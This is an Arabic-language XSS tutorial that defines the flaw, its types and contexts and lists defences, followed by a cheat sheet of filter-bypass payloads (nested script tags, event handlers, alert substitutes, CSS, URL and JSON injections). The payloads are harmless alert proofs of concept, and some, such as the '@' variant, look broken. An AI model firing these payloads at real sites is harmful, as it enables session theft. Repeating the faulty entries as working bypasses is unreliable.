## 1. مقدمة

**Cross-Site Scripting (XSS)** هي ثغرة تسمح للمهاجم بحقن وتشغيل JavaScript داخل متصفح الضحية، مما يسمح بتجاوز Same-Origin Policy.

## 2. كيف تعمل XSS

عندما يعرض الموقع مدخلات المستخدم بدون فلترة، يمكن تنفيذ كود JavaScript خبيث.

## 3. أنواع XSS

- **Reflected XSS**
    
- **Stored XSS**
    
- **DOM-Based XSS**
    

## 4. ماذا يستطيع المهاجم فعله

- سرقة Cookies
    
- انتحال الهوية
    
- تنفيذ أفعال نيابة عن المستخدم
    

## 5. Contexts

- HTML
    
- Attribute
    
- JavaScript
    
- URL
    

## 6. حماية:

- Input Filtering
    
- Output Encoding
    
- CSP
    
- Security Headers
    

## 7. Payloads

### لو script مسموح

```
<script>alert(1)</script>
```

### لو يتم حذف كلمة script فقط

```
<scr<script>ipt>alert(1)</scr<script>ipt>
```

### لو يمنع الوسوم لكن يسمح بالـevents

```
<img src=x onerror=alert(1)>
```

### لو يمنع كلمة alert

```
confirm(1)
prompt(1)
```

### لو يمنع الأقواس

```
Function`alert\`1\``
```

### لو يمنع علامات التنصيص

```
<svg/onload=alert(1)>
```

### لو يمنع =

```
<svg/onload@alert(1)>
```

### XSS عبر CSS

```
<div style="background:url(javascript:alert(1))">
```

### XSS عبر SVG

```
<svg/onload=alert(1)>
```

### XSS عبر URL

```
?x="><img src=x onerror=alert(1)>
```

### XSS عبر JSON

```
{"name":"</script><img src=x onerror=alert(1)>"}
```

### DOM XSS

```
" onmouseover="alert(1)
```